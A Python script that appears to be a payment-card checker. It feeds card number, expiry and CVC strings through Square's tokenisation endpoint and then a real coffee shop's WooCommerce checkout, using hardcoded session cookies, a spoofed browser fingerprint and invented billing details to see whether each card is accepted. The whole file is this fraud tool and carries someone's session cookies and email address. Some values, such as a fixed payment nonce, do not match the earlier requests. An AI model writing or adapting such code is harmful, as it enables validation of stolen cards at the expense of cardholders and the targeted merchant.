import os
import time
import requests
import user_agent

def Tele(ccx):
    try:
        ccx = ccx.strip()
        n = ccx.split("|")[0]
        mm = ccx.split("|")[1]
        yy = ccx.split("|")[2]
        cvc = ccx.split("|")[3]
        mm = mm.lstrip("0")
        loop = n[-4:]
        id = ''
        mazen = ''
        tok = ''
        

        cookies = {
                        '__cf_bm': '2G2_ZaVNxitlTGLdA_1taZ_Kq7do47zkLg_R.g4.fis-1704892780-1-AV6HXT881ElWG23C5KrqeZG6ITbAxAceDvSFp5IsHidchQvF3OnNQG+fMFftiLpTAjyo0OOttJP0lcQsZRWkHrc=',
                        '_savt': '7944b76c-a0bc-4ed0-9203-0e98fdc5c541',
                    }

        headers = {
                        'authority': 'pci-connect.squareup.com',
                        'accept': 'application/json',
                        'accept-language': 'ar-YE,ar;q=0.9,en-US;q=0.8,en;q=0.7',
                        'content-type': 'application/json; charset=utf-8',
                        'origin': 'https://web.squarecdn.com',
                        'referer': 'https://web.squarecdn.com/',
                        'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                        'sec-ch-ua-mobile': '?1',
                        'sec-ch-ua-platform': '"Android"',
                        'sec-fetch-dest': 'empty',
                        'sec-fetch-mode': 'cors',
                        'sec-fetch-site': 'cross-site',
                        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
                    }

        params = {
                        '_': '1704893339497.4238',
                        'version': '1.54.4',
                    }

        json_data = {
                        'client_id': 'sq0idp-wGVapF8sNt9PLrdj5znuKA',
                        'location_id': '0V2T5B20JPS2S',
                        'payment_method_tracking_id': id,
                        'session_id': 'j47T3fjUp8Frz2Cjhx1DwJiMtbYxQVJvbyg1OjUr75pVa_hEBZ2daAFgswaZyLrToo5B8ug_poGA3PIX88U=',
                        'website_url': 'handlebarcoffee.com',
                        'analytics_token': mazen,
                        'card_data': {
                            'billing_postal_code': '10001',
                            'cvv': f'{cvc}',
                            'exp_month': f'{mm}',
                            'exp_year': f'{yy}',
                            'number': f'{n}',
                        },
                    }

        response = requests.post(
                        'https://pci-connect.squareup.com/v2/card-nonce',
                        params=params,
                        cookies=cookies,
                        headers=headers,
                        json=json_data,
                    )
        cookies = {
    'wordpress_sec_51c0ee706bd57a164a9d10c3106c2996': 'esszz12345678%7C1706102364%7C6Dqf5WUOnpk0XGHS9hSyaaJJTspRhfQRuHTf2AbS0PS%7C49027e8a38b752a83ad366e84980ea922876b95875c6ab36364a449c3fef35d7',
    '_ga': 'GA1.1.1378016342.1704892577',
    'tk_or': '%22%22',
    'tk_r3d': '%22%22',
    'tk_lr': '%22%22',
    'cookie_notice_accepted': 'true',
    'wordpress_logged_in_51c0ee706bd57a164a9d10c3106c2996': 'esszz12345678%7C1706102364%7C6Dqf5WUOnpk0XGHS9hSyaaJJTspRhfQRuHTf2AbS0PS%7C255068e8b574abdc4c450153b79960c42606883d3d7d7cae243e8ab8082f187b',
    'mailchimp_user_email': 'esszz12345678%40gmail.com',
    'tk_ai': 'Yl%2FMzM26VSdg0zg1GAI9o%2F0d',
    'wp_woocommerce_session_51c0ee706bd57a164a9d10c3106c2996': '139621%7C%7C1705065975%7C%7C1705062375%7C%7Ce964489d3a8437e278e7c2a9adb1598e',
    'woocommerce_items_in_cart': '1',
    'woocommerce_cart_hash': '73a2f32583f8ea1679099807c98d4509',
    'mailchimp.cart.current_email': 'esszz12345678@gmail.com',
    'mailchimp.cart.previous_email': 'esszz12345678@gmail.com',
    'mailchimp_landing_site': 'https%3A%2F%2Fhandlebarcoffee.com%2Fcheckout%2F',
    'tk_qs': '',
    '_ga_58P6Y56Q58': 'GS1.1.1704897428.2.1.1704897993.0.0.0',
}

        headers = {
    'authority': 'handlebarcoffee.com',
    'accept': '*/*',
    'accept-language': 'ar-YE,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'wordpress_sec_51c0ee706bd57a164a9d10c3106c2996=esszz12345678%7C1706102364%7C6Dqf5WUOnpk0XGHS9hSyaaJJTspRhfQRuHTf2AbS0PS%7C49027e8a38b752a83ad366e84980ea922876b95875c6ab36364a449c3fef35d7; _ga=GA1.1.1378016342.1704892577; tk_or=%22%22; tk_r3d=%22%22; tk_lr=%22%22; cookie_notice_accepted=true; wordpress_logged_in_51c0ee706bd57a164a9d10c3106c2996=esszz12345678%7C1706102364%7C6Dqf5WUOnpk0XGHS9hSyaaJJTspRhfQRuHTf2AbS0PS%7C255068e8b574abdc4c450153b79960c42606883d3d7d7cae243e8ab8082f187b; mailchimp_user_email=esszz12345678%40gmail.com; tk_ai=Yl%2FMzM26VSdg0zg1GAI9o%2F0d; wp_woocommerce_session_51c0ee706bd57a164a9d10c3106c2996=139621%7C%7C1705065975%7C%7C1705062375%7C%7Ce964489d3a8437e278e7c2a9adb1598e; woocommerce_items_in_cart=1; woocommerce_cart_hash=73a2f32583f8ea1679099807c98d4509; mailchimp.cart.current_email=esszz12345678@gmail.com; mailchimp.cart.previous_email=esszz12345678@gmail.com; mailchimp_landing_site=https%3A%2F%2Fhandlebarcoffee.com%2Fcheckout%2F; tk_qs=; _ga_58P6Y56Q58=GS1.1.1704897428.2.1.1704897993.0.0.0',
    'origin': 'https://handlebarcoffee.com',
    'referer': 'https://handlebarcoffee.com/checkout/',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

        data = {
    'action': 'wc_square_credit_card_get_order_amount',
    'security': '027607d077',
    'order_id': '0',
    'is_pay_order': 'false',
}

        response = requests.post('https://handlebarcoffee.com/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data)


        cookies = {
    '_savt': '7944b76c-a0bc-4ed0-9203-0e98fdc5c541',
    '__cf_bm': 'T7sCBTlIbRF757UKDZYgvvGzOsYEy1s9fn_HUFW_ZkU-1704897436-1-AVOa9M9EfYZn4e/4u50Rx/II+xCTkVM8crfVI8V2dcNP+rvnFrEdLI/TIb/cbW8z98hcFbn007e/eAogFuVZE8U=',
}

        headers = {
    'authority': 'connect.squareup.com',
    'accept': '*/*',
    'accept-language': 'ar-YE,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/json',
    # 'cookie': '_savt=7944b76c-a0bc-4ed0-9203-0e98fdc5c541; __cf_bm=T7sCBTlIbRF757UKDZYgvvGzOsYEy1s9fn_HUFW_ZkU-1704897436-1-AVOa9M9EfYZn4e/4u50Rx/II+xCTkVM8crfVI8V2dcNP+rvnFrEdLI/TIb/cbW8z98hcFbn007e/eAogFuVZE8U=',
    'origin': 'https://connect.squareup.com',
    'referer': 'https://connect.squareup.com/payments/data/frame.html?referer=https%3A%2F%2Fhandlebarcoffee.com%2Fcheckout%2F',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
}

        json_data = {
    'components': '{"user_agent":"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36","language":"ar-YE","color_depth":24,"resolution":[780,360],"available_resolution":[780,360],"timezone_offset":-180,"session_storage":1,"local_storage":1,"open_database":1,"cpu_class":"unknown","navigator_platform":"Linux armv81","do_not_track":"unknown","regular_plugins":[],"adblock":false,"has_lied_languages":false,"has_lied_resolution":false,"has_lied_os":false,"has_lied_browser":false,"touch_support":[5,true,true],"js_fonts":["Arial","Courier","Courier New","Georgia","Helvetica","Monaco","Palatino","Tahoma","Times","Times New Roman","Verdana","Wingdings 2","Wingdings 3"]}',
    'fingerprint': '87811923a55a6a8d8c982ab4aa893b4a',
    'timezone': '-180',
    'user_agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    'version': 'd5fd6b68f21264c14a6aa32a61e8eefe29a68770',
    'website_url': 'https://handlebarcoffee.com/',
    'client_id': 'sq0idp-wGVapF8sNt9PLrdj5znuKA',
    'browser_fingerprint_by_version': [
        {
            'payload_json': '{"components":{"user_agent":"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36","language":"ar-YE","color_depth":24,"resolution":[780,360],"available_resolution":[780,360],"timezone_offset":-180,"session_storage":1,"local_storage":1,"open_database":1,"cpu_class":"unknown","navigator_platform":"Linux armv81","do_not_track":"unknown","regular_plugins":[],"adblock":false,"has_lied_languages":false,"has_lied_resolution":false,"has_lied_os":false,"has_lied_browser":false,"touch_support":[5,true,true],"js_fonts":["Arial","Courier","Courier New","Georgia","Helvetica","Monaco","Palatino","Tahoma","Times","Times New Roman","Verdana","Wingdings 2","Wingdings 3"]},"fingerprint":"87811923a55a6a8d8c982ab4aa893b4a"}',
            'payload_type': 'fingerprint-v1',
        },
        {
            'payload_json': '{"components":{"language":"ar-YE","color_depth":24,"resolution":[780,360],"available_resolution":[780,360],"timezone_offset":-180,"session_storage":1,"local_storage":1,"open_database":1,"cpu_class":"unknown","navigator_platform":"Linux armv81","do_not_track":"unknown","regular_plugins":[],"adblock":false,"has_lied_languages":false,"has_lied_resolution":false,"has_lied_os":false,"has_lied_browser":false,"touch_support":[5,true,true],"js_fonts":["Arial","Courier","Courier New","Georgia","Helvetica","Monaco","Palatino","Tahoma","Times","Times New Roman","Verdana","Wingdings 2","Wingdings 3"]},"fingerprint":"4d84ef71ed62459f97165c200c54f748"}',
            'payload_type': 'fingerprint-v1-sans-ua',
        },
    ],
}

        response = requests.post('https://connect.squareup.com/v2/analytics/token', cookies=cookies, headers=headers, json=json_data)
        id = response.json().get('payment_method_tracking_id')
        mazen = response.json().get('analytics_token')
        tok = response.json().get('wc-square-credit-card-buyer-verification-token')
        cookies = {
                        'mailchimp_landing_site': 'https%3A%2F%2Fhandlebarcoffee.com%2Fmy-account%2Fadd-payment-method%2F',
                        '_ga': 'GA1.1.1378016342.1704892577',
                        'tk_or': '%22%22',
                        'tk_r3d': '%22%22',
                        'tk_lr': '%22%22',
                        'cookie_notice_accepted': 'true',
                        'mailchimp.cart.current_email': 'esszz12345678@gmail.com',
                        'wordpress_logged_in_51c0ee706bd57a164a9d10c3106c2996': 'esszz12345678%7C1706102364%7C6Dqf5WUOnpk0XGHS9hSyaaJJTspRhfQRuHTf2AbS0PS%7C255068e8b574abdc4c450153b79960c42606883d3d7d7cae243e8ab8082f187b',
                        'mailchimp_user_email': 'esszz12345678%40gmail.com',
                        'tk_ai': 'Yl%2FMzM26VSdg0zg1GAI9o%2F0d',
                        'woocommerce_items_in_cart': '1',
                        'wp_woocommerce_session_51c0ee706bd57a164a9d10c3106c2996': '139621%7C%7C1705065975%7C%7C1705062375%7C%7Ce964489d3a8437e278e7c2a9adb1598e',
                        'tk_qs': '',
                        'mailchimp.cart.previous_email': 'esszz12345678@gmail.com',
                        'woocommerce_cart_hash': '73a2f32583f8ea1679099807c98d4509',
                        '_ga_58P6Y56Q58': 'GS1.1.1704892576.1.1.1704893320.0.0.0',
                    }

        headers = {
                        'authority': 'handlebarcoffee.com',
                        'accept': 'application/json, text/javascript, */*; q=0.01',
                        'accept-language': 'ar-YE,ar;q=0.9,en-US;q=0.8,en;q=0.7',
                        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                        'origin': 'https://handlebarcoffee.com',
                        'referer': 'https://handlebarcoffee.com/checkout/',
                        'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                        'sec-ch-ua-mobile': '?1',
                        'sec-ch-ua-platform': '"Android"',
                        'sec-fetch-dest': 'empty',
                        'sec-fetch-mode': 'cors',
                        'sec-fetch-site': 'same-origin',
                        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
                        'x-requested-with': 'XMLHttpRequest',
                    }

        params = {
                        'wc-ajax': 'checkout',
                    }

        data = {
                        'billing_first_name': 'Ahmed',
                        'billing_last_name': 'Alhrrani',
                        'billing_company': 'mahos-python',
                        'billing_country': 'US',
                        'billing_address_1': 'almkkipp',
                        'billing_address_2': 'ako1009',
                        'billing_city': 'NewYork',
                        'billing_state': 'NY',
                        'billing_postcode': '10001',
                        'billing_phone': '500669911',
                        'billing_email': 'esszz12345678@gmail.com',
                        'shipping_first_name': '',
                        'shipping_last_name': '',
                        'shipping_company': '',
                        'shipping_country': 'US',
                        'shipping_address_1': '',
                        'shipping_address_2': '',
                        'shipping_city': '',
                        'shipping_state': 'CA',
                        'shipping_postcode': '',
                        'shipping_phone': '',
                        'shipping_method[0]': 'usps:1:D_PRIORITY_MAIL',
                        'payment_method': 'square_credit_card',
                        'wc-square-credit-card-card-type': 'VISA',
                        'wc-square-credit-card-last-four': f'{loop}',
                        'wc-square-credit-card-exp-month': f'{mm}',
                        'wc-square-credit-card-exp-year': f'{yy}',
                        'wc-square-credit-card-payment-nonce': 'cnon:CBESELX6rHk8qKMAa6kHWJ3WiQA',
                        'wc-square-credit-card-payment-postcode': '10001',
                        'wc-square-credit-card-buyer-verification-token': f'{tok}',
                        'wc-square-credit-card-tokenize-payment-method': 'true',
                        'terms': 'on',
                        'terms-field': '1',
                        'woocommerce-process-checkout-nonce': '9575c72091',
                        '_wp_http_referer': '/?wc-ajax=update_order_review',
                    }

        response = requests.post('https://handlebarcoffee.com/', params=params, cookies=cookies, headers=headers, data=data)
                    
        ii = response.json()
        print(ii)
    except Exception as e:
        print(f"An error occurred: {e}")


        